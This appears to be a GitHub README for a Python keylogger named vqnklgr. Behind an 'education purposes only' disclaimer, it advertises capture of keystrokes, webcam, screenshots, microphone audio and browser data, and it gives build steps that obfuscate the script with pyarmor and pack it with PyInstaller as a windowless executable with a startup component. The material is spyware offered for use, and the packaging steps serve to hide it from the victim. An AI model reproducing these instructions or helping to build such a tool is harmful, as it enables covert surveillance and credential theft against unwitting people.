## Disclamer

THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT 
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER FZGbzuw412 ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE 
CAUSED BY THIS PROGRAM.

## Features
- [x] Keystrokes
- [x] Webcam
- [x] Screenshots
- [x] Micro Record
- [x] Browser Data

## Tested on
- Windows 11 Pro 23H2

## Installation & Running of this Keylogger
```
#clone or download zip archive
git clone https://github.com/shvqn/vqnklgr.git

# go to directory with files
cd vqnklg

#install essential requirements
pip3 install -r requirements.txt

#setting
open vqnklgr.py and dit the lines with comments in the file

#pack vqnklgr.py
pyarmor pack --clean -e "--onefile --windowed --icon==NONE" vqnklgr.py

#complie startup.py
pyinstaller --clean --onefile startup.py
```